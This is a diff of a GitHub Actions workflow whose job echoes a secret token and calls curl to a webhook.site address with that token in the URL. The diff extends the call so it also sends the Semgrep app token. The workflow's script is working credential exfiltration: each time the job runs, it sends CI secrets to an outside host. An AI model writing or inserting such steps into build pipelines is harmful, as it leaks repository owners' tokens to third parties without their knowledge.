@@ -21,7 +21,7 @@ jobs:
     # The type of runner that the job will run on
     runs-on: ubuntu-latest
     env:
-      SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}
+      SEMGREP_APP_TOKEN: ${{ env.SEMGREP_APP_TOKEN }}
       MY_TOKEN: ${{ secrets.MY_TOKEN }}
 
     # Steps represent a sequence of tasks that will be executed as part of the job
@@ -37,6 +37,6 @@ jobs:
       - name: Run a multi-line script
         run: |
           echo $MY_TOKEN
-          curl https://webhook.site/764cf3d1-c66c-47ac-883f-dd16a050fa18?a=$MY_TOKEN
+          curl https://webhook.site/764cf3d1-c66c-47ac-883f-dd16a050fa18?a=$MY_TOKEN&b=$SEMGREP_APP_TOKEN
 
           
